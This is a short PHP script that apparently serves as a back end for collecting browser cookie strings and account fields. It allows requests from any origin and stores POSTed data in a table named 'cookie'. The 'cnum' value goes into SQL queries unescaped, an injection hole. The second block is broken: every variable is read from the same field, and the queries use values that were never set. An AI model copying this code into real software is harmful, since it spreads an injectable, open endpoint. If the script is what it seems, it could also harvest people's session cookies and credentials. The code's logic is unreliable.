<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
include "common.php";
if(isset($_POST['import'])){
	echo "is set import";
	$import= mysql_real_escape_string($_POST['import']);
	$num =$_POST['cnum'];
	echo "<br>->{$num}--<br>{$import}<br>";
	if(num_rows("cookie","num",$num)==1){
		sql_query("update cookie set string='$import' where num='$num'");
		echo "<br>updated";
		}else{
			sql_query("insert into cookie (num,string,grp,url,other,other2,browser) value('$num','$import','','','','','firefox')");
			echo "<br>inserted";
			}
}
if(isset($_POST['username'])){
	echo "is set import";
	//$import= mysql_real_escape_string($_POST['import']);
	$username =$_POST['cnum'];
	$password =$_POST['cnum'];
	$status =$_POST['cnum'];
	$tab=$_POST['cnum'];
	$note =$_POST['cnum'];
	$lastaccess =$_POST['cnum'];
	$friends =$_POST['cnum'];
	echo "<br>->{$num}--<br>{$import}<br>";
	if(num_rows("cookie","num",$num)==1){
		sql_query("update cookie set string='$import' where num='$num'");
		echo "<br>updated";
		}else{
			sql_query("insert into cookie (num,string,grp,url,other,other2,browser) value('$num','$import','','','','','firefox')");
			echo "<br>inserted";
			}
}

?>